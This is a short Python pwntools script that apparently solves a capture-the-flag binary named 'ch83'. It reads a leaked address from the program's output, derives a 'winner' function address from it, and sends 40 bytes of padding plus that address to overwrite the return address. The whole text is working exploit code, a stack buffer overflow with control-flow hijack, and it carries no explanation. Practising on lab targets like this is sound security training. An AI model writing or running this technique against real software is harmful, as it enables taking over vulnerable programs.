from pwn import *
context.bits = 64

overwrite = b"A"*40

p = process("./ch83")

print(p.recvline())
leak = (p.recvline().split(b"0x")[-1].strip())

leak = int(b"0x"+leak,16)

winner = leak - 160

payload = overwrite + p64(winner)

p.sendline(payload)
p.interactive()
